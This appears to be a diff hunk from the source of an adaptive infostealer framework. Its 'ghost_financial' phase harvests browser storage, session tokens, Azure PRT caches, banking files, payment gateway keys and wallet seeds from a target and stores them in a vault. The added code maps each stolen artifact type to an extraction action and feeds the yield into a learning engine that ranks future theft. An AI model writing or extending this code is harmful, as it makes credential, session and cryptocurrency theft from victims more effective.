@@ -751,6 +751,35 @@ def run_phase5_financial(vault=None, agent_id: str = "ghost_financial", remote_c
         try:
             results = fn()
             phase5[key] = results
+            
+            # Direct causal feedback loop: feed extraction outcome to LearningAgent / CausalDecisionEngine
+            try:
+                from agents.learning import LearningAgent
+                from causal_decision_engine import CausalDecisionEngine
+                # Map artifact_type to causal intervention name
+                causal_action_map = {
+                    "browser_web_storage": "extract_chrome",
+                    "electron_session_token": "extract_chrome",
+                    "azure_prt_cache": "extract_cloud",
+                    "erp_accounting_config": "extract_db",
+                    "banking_batch_file": "extract_cloud",
+                    "web3_developer_secret": "extract_crypto",
+                    "payment_gateway_key": "extract_cloud",
+                    "wallet_seed": "extract_crypto",
+                    "financial_document": "extract_chrome",
+                }
+                action_name = causal_action_map.get(artifact_type, "extract_chrome")
+                actual_val = min(len(results) * 0.25, 1.0)
+                engine = CausalDecisionEngine.instance()
+                engine.extraction_graph.learn_from_outcome(
+                    intervention=action_name,
+                    actual_effects={"data_value": actual_val},
+                    alpha=0.25,
+                    create_missing=True
+                )
+            except Exception as causal_exc:
+                logger.debug("[P5] Online causal learning hook skipped: %s", causal_exc)
+
             if vault is not None and results:
                 meta: Dict[str, Any] = {
                     "target_id": target_id,
